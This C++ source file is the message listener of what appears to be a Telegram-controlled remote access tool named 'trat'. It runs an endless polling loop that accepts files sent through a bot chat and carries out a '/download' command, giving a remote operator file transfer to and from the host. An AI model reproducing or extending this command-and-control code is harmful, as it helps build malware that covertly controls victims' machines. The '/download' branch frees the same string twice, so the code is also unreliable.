/* trat/src/Bot/listen.cpp */
#include "../../include/bot.hpp"
#include <chrono>
#include <cstring>
#include <thread>
#include <future>


namespace trat
{
  void Bot::listen()
  {
    int offset = -1;
    telebot_update_type_e update_types[] = {TELEBOT_UPDATE_TYPE_MESSAGE};
    telebot_error_e ret;    
    while (true)
    {
      telebot_update_t* updates = nullptr; 
      int count = 0; 
      ret = telebot_get_updates(handle, offset, 20, 0, update_types, 1, &updates, &count);
      if (ret != TELEBOT_ERROR_NONE)
      {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        continue;
      }

      for (int i = 0; i < count; ++i)
      {
        const auto& update = updates[i];
        if (update.update_type == TELEBOT_UPDATE_TYPE_MESSAGE)
        {
          const auto& message = update.message;
          auto message_text = message.text;
          auto message_document = message.document;

          if ((!message_document) && (!(this -> checkIfCommand(message_text)) ))
          { 
            auto future = std::async(std::launch::async, [this]()
            {
              this->sendMessage("This is not a valid command");
            });
            future.get();
          }
          if ( (message_document) && (!message_text) )
          {
            auto future = std::async(std::launch::async, [this, message_document]()
            {
              this -> sendMessage("Downloading document");
              this -> handleDocuments(message_document);
            });
            future.get();
          }
          else if ( (!message_document) && (message_text) )
          {
            char* precieved_command = parser::getPrefixFromString(message_text, ' ');
            if ( strcmp(precieved_command, "/download") == 0 )
            {
              auto future = std::async(std::launch::async, [this, message_text]()
              {
                this -> handleDownloadCommand(message_text);
              });
              future.get(); 
              parser::cleanString(precieved_command);
            }
            parser::cleanString(precieved_command);
          }
          
          offset = update.update_id + 1;
          std::this_thread::sleep_for(std::chrono::seconds(1));
        }
      }
      // Clean up the updates array to avoid memory leaks
      telebot_put_updates(updates, count);
    }
  }
}
